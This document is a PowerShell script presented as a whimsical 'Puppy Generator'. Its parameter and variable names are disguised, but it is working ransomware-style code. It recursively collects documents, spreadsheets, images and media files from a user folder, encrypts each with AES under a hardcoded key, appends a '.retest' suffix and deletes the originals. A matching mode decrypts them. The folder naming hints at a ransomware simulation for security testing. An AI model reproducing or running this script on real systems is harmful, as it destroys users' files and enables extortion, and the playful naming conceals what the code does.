<# 
.SYNOPSIS
    Puppy Generator

.DESCRIPTION
    This script is intended to generate puppies and now supports specifying the folder to encrypt or decrypt.

.PARAMETER FolderPath
    The folder containing files to encrypt or decrypt.

.PARAMETER File Extension
    What file extensions should your puppies have.

.PARAMETER Puppifyion key
    Name for your puppies.

.PARAMETER DelayInMilliseconds
    The delay in milliseconds between processing each file.

.PARAMETER MaxConcurrentJobs
    The maximum number of jobs to run concurrently.
#>

# Define parameters and their defaults
param(
    [string]$Mode,
    [string]$FolderPath = "C:\Users\retest2\Pictures\",  # Default folder to encrypt or decrypt
    [string]$LastName = ".retest",
    [string]$Callsign = "QRkpt21jo2Lu6wn82hlY9k8xUj5KyUrJOPIC9da41jg=",
    [int]$DelayInMilliseconds = 0,  # Default to no delay
    [int]$MaxConcurrentJobs = 4 # Default to 4 concurrent jobs
)

$PuppyBreeds = '*.pdf','*.xls*','*.ppt*','*.doc*','*.accd*','*.rtf','*.txt','*.csv','*.jpg','*.jpeg','*.png','*.gif','*.avi','*.midi','*.mov','*.mp3','*.mp4','*.mpeg','*.mpeg2','*.mpeg3','*.mpg','*.ogg'

ipmo ".\FileCryptography.psm1"

if (-not (Test-Path $FolderPath)) {
    Write-Host "The specified folder path does not exist: $FolderPath" -ForegroundColor Red
    exit
}

if ($mode -eq "puppify") {
    # Gather all files from the folder path and its subdirectories
    $FilesToPuppify = Get-ChildItem -Include $PuppyBreeds -Recurse -Force -Path "$FolderPath*" -Exclude *$LastName | Where-Object { -not $_.PSIsContainer }
    $NumPuppies = $FilesToPuppify.Length

    # Puppify the files using jobs
    $Jobs = @()
    foreach ($puppy in $FilesToPuppify) {
        # Wait if too many jobs are running
        while ($Jobs.Count -ge $MaxConcurrentJobs) {
            $Jobs = $Jobs | Where-Object { $_.State -ne "Completed" }
            Start-Sleep -Milliseconds 500
        }

        # Start a new job
        $Jobs += Start-Job -ScriptBlock {
            param ($puppyPath, $key, $suffix, $delay)
            Import-Module ".\FileCryptography.psm1"
            Write-Host "Puppifying $puppyPath"
            Protect-File $puppyPath -KeyAsPlainText $key -Suffix $suffix -Algorithm AES -RemoveSource
            Start-Sleep -Milliseconds $delay
        } -ArgumentList $puppy.FullName, $Callsign, $LastName, $DelayInMilliseconds
    }

    # Wait for all jobs to complete
    $Jobs | ForEach-Object { Receive-Job -Job $_; Remove-Job -Job $_ }
    Write-Host "Puppified $NumPuppies"
}

elseif ($mode -eq "depuppify") {
    # Gather all files from the folder path and its subdirectories
    $FilesToDepuppify = Get-ChildItem -Path "$FolderPath*" -Include *$LastName -Recurse -Force | Where-Object { -not $_.PSIsContainer }

    # Depuppify the files using jobs
    $Jobs = @()
    foreach ($puppy in $FilesToDepuppify) {
        # Wait if too many jobs are running
        while ($Jobs.Count -ge $MaxConcurrentJobs) {
            $Jobs = $Jobs | Where-Object { $_.State -ne "Completed" }
            Start-Sleep -Milliseconds 500
        }

        # Start a new job
        $Jobs += Start-Job -ScriptBlock {
            param ($puppyPath, $key, $suffix, $delay)
            Import-Module ".\FileCryptography.psm1"
            Write-Host "Depuppifying $puppyPath"
            Unprotect-File $puppyPath -KeyAsPlainText $key -Suffix $suffix -Algorithm AES -RemoveSource
            Start-Sleep -Milliseconds $delay
        } -ArgumentList $puppy.FullName, $Callsign, $LastName, $DelayInMilliseconds
    }

    # Wait for all jobs to complete
    $Jobs | ForEach-Object { Receive-Job -Job $_; Remove-Job -Job $_ }
} 

else {
    Write-Host "You must puppify or depuppify"
}
exit
